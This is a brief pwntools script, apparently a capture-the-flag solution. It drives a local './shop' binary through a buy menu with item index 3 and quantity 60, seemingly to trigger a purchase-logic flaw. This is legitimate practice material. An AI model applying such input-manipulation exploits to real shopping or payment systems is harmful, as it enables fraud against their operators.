#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

def conn():
    return process("./shop")

p = conn()

p.sendlineafter(b"> ", b"b")
p.sendlineafter(b"Item index:", b"3")
p.sendlineafter(b"Quantity:", b"60")

p.interactive()
